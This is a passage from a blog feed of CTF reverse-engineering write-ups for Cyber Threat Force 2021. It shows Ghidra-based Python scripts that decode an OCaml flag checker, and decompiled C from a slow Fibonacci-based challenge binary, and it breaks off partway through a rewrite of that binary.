&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> struct
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">getUBytes&lt;/span>(address, length):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> bytearray([b &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xff&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> b &lt;span style="color:#f92672">in&lt;/span> getBytes(address, length)])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">u32&lt;/span>(raw_bytes):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> struct&lt;span style="color:#f92672">.&lt;/span>unpack(&lt;span style="color:#e6db74">&amp;#39;&amp;lt;L&amp;#39;&lt;/span>, raw_bytes)[&lt;span style="color:#ae81ff">0&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">read_caml_array&lt;/span>(pointer, data_len):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> array &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> array&lt;span style="color:#f92672">.&lt;/span>append(getUBytes(toAddr(pointer), data_len))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pointer &lt;span style="color:#f92672">=&lt;/span> u32(getBytes(toAddr(pointer &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>), &lt;span style="color:#ae81ff">4&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> array
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># The address refers to the argument passed to camlReverse__firstCheck_268.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># For each value, map the bytes to an int, divide by two, and cast to char.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag_start &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(chr(u32(b) &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> b &lt;span style="color:#f92672">in&lt;/span> read_caml_array(&lt;span style="color:#ae81ff">0x00160898&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(flag_start)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>extractCaml&lt;span style="color:#f92672">.&lt;/span>py&lt;span style="color:#f92672">&amp;gt;&lt;/span> Running&lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>CYBERTF{Go
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>extractCaml&lt;span style="color:#f92672">.&lt;/span>py&lt;span style="color:#f92672">&amp;gt;&lt;/span> Finished&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>When reversing the &lt;code>* 2 + 1&lt;/code> operation, all we really have to do is &lt;code>// 2&lt;/code> (because it is an integer division).&lt;/p>
&lt;p>We can now finish the job by extracting the XOR key &amp;amp; data, which are stored using the same array format:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> struct
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> itertools
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">getUBytes&lt;/span>(address, length):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> bytearray([b &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xff&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> b &lt;span style="color:#f92672">in&lt;/span> getBytes(address, length)])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">u32&lt;/span>(raw_bytes):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> struct&lt;span style="color:#f92672">.&lt;/span>unpack(&lt;span style="color:#e6db74">&amp;#39;&amp;lt;L&amp;#39;&lt;/span>, raw_bytes)[&lt;span style="color:#ae81ff">0&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">read_caml_array&lt;/span>(pointer, data_len):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> array &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> array&lt;span style="color:#f92672">.&lt;/span>append(getUBytes(toAddr(pointer), data_len))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pointer &lt;span style="color:#f92672">=&lt;/span> u32(getBytes(toAddr(pointer &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>), &lt;span style="color:#ae81ff">4&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> array
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># The address refers to the argument passed to camlReverse__firstCheck_268.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># For each value, map the bytes to an int, divide by two, and cast to char.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag_start &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(chr(u32(b) &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> b &lt;span style="color:#f92672">in&lt;/span> read_caml_array(&lt;span style="color:#ae81ff">0x00160898&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># The address refers to the argument passed to camlReverse__xor_103.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># For each value, map the bytes to an int.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>xor_key &lt;span style="color:#f92672">=&lt;/span> [u32(x) &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> read_caml_array(&lt;span style="color:#ae81ff">0x001601b0&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>)]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># The address refers to the argument passed to camlReverse__listequal_92.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># For each value, map the bytes to an int.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>xor_data &lt;span style="color:#f92672">=&lt;/span> [u32(x) &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> read_caml_array(&lt;span style="color:#ae81ff">0x00160208&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>)]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Xor the key with the data, and divide each value by two before converting it to a char.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag_end &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(chr((a &lt;span style="color:#f92672">^&lt;/span> b) &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(itertools&lt;span style="color:#f92672">.&lt;/span>cycle(xor_key), xor_data))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(flag_start &lt;span style="color:#f92672">+&lt;/span> flag_end)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>extractCaml&lt;span style="color:#f92672">.&lt;/span>py&lt;span style="color:#f92672">&amp;gt;&lt;/span> Running&lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>CYBERTF{Golang_is_D3&lt;span style="color:#a6e22e">@d_1n_CTF_1795b4a89708371d16982195642638cd7783998188&lt;/span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>extractCaml&lt;span style="color:#f92672">.&lt;/span>py&lt;span style="color:#f92672">&amp;gt;&lt;/span> Finished&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>I have to say, the API doesn&amp;rsquo;t seem too intuitive, but at least it is powerful.&lt;/p>
&lt;h2 id="more">More&lt;/h2>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/reverse/flag-checker">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Take your time</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-take-your-time/</link><pubDate>Thu, 08 Jul 2021 23:01:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-take-your-time/</guid><description>For this challenge, we were given a TakeYourTime executable, which seems to hang when we run it. We can analyze its code using ghidra:
unsigned int FLAG[] = { 0xb5, 0x63, 0x98, 0x3d, 0xb5, 0x06, 0x46, 0xba, 0x0f, 0xd5, 0x47, 0xce, 0x97, 0xef, 0x7b, 0x28, 0xdb, 0xe7, 0x39, 0x10, 0xb0, 0xf5, 0x44, 0xec, 0x30, 0x88, 0x46, 0xf6, 0x88, }; undefined8 main(void) { byte bVar1; int iVar2; uint local_28; int local_24; ulong local_20; local_28 = 0; local_20 = 0x32; while (local_20 &amp;lt; 0x4f) { bVar1 = fibonacci(); local_28 = local_28 &amp;gt;&amp;gt; 8 | (local_28 ^ bVar1) &amp;lt;&amp;lt; 0x18; local_20 = local_20 + 1; } srand(local_28); local_24 = 0; while (local_24 &amp;lt; 0x1d) { bVar1 = FLAG[local_24]; iVar2 = rand(); putchar((uint)bVar1 ^ iVar2 % 0xff); local_24 = local_24 + 1; } puts(&amp;#34;\nGood you can validate the chall with this password ;)!</description><content>&lt;p>For this challenge, we were given a &lt;code>TakeYourTime&lt;/code> executable, which seems to hang when we run it. We can analyze its code using ghidra:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> FLAG[] &lt;span style="color:#f92672">=&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0xb5&lt;/span>, &lt;span style="color:#ae81ff">0x63&lt;/span>, &lt;span style="color:#ae81ff">0x98&lt;/span>, &lt;span style="color:#ae81ff">0x3d&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0xb5&lt;/span>, &lt;span style="color:#ae81ff">0x06&lt;/span>, &lt;span style="color:#ae81ff">0x46&lt;/span>, &lt;span style="color:#ae81ff">0xba&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0x0f&lt;/span>, &lt;span style="color:#ae81ff">0xd5&lt;/span>, &lt;span style="color:#ae81ff">0x47&lt;/span>, &lt;span style="color:#ae81ff">0xce&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0x97&lt;/span>, &lt;span style="color:#ae81ff">0xef&lt;/span>, &lt;span style="color:#ae81ff">0x7b&lt;/span>, &lt;span style="color:#ae81ff">0x28&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0xdb&lt;/span>, &lt;span style="color:#ae81ff">0xe7&lt;/span>, &lt;span style="color:#ae81ff">0x39&lt;/span>, &lt;span style="color:#ae81ff">0x10&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0xb0&lt;/span>, &lt;span style="color:#ae81ff">0xf5&lt;/span>, &lt;span style="color:#ae81ff">0x44&lt;/span>, &lt;span style="color:#ae81ff">0xec&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0x30&lt;/span>, &lt;span style="color:#ae81ff">0x88&lt;/span>, &lt;span style="color:#ae81ff">0x46&lt;/span>, &lt;span style="color:#ae81ff">0xf6&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0x88&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>undefined8 &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> byte bVar1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> iVar2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> uint local_28;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> local_24;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulong local_20;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> local_28 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> local_20 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x32&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> (local_20 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x4f&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bVar1 &lt;span style="color:#f92672">=&lt;/span> fibonacci();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> local_28 &lt;span style="color:#f92672">=&lt;/span> local_28 &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">|&lt;/span> (local_28 &lt;span style="color:#f92672">^&lt;/span> bVar1) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x18&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> local_20 &lt;span style="color:#f92672">=&lt;/span> local_20 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> srand(local_28);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> local_24 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> (local_24 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x1d&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bVar1 &lt;span style="color:#f92672">=&lt;/span> FLAG[local_24];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> iVar2 &lt;span style="color:#f92672">=&lt;/span> rand();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> putchar((uint)bVar1 &lt;span style="color:#f92672">^&lt;/span> iVar2 &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">0xff&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> local_24 &lt;span style="color:#f92672">=&lt;/span> local_24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">Good you can validate the chall with this password ;)!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">fibonacci&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> param_1) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">long&lt;/span> lVar1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">long&lt;/span> lVar2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param_1 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lVar1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param_1 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lVar1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lVar2 &lt;span style="color:#f92672">=&lt;/span> fibonacci(param_1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lVar1 &lt;span style="color:#f92672">=&lt;/span> fibonacci(param_1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lVar1 &lt;span style="color:#f92672">=&lt;/span> lVar1 &lt;span style="color:#f92672">+&lt;/span> lVar2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> lVar1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>What&amp;rsquo;s happening there is that the program takes too long to execute: the fibonacci implementation is a naive one (recursive).&lt;/p>
&lt;p>Let&amp;rsquo;s be as lazy as possible and rewrite the program hardcoding the values that are needed:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">fibo&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> param) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">12586269025&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">51&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">20365011074&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">52&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">32951280099&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">53&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">53316291173&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">54&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">86267571272&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">55&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">139583862445&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">56&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">225851433717&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">57&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">365435296162&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">58&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">591286729879&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">59&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">956722026041&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">60&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1548008755920&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">61&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">2504730781961&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">62&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">4052739537881&lt;/span>;
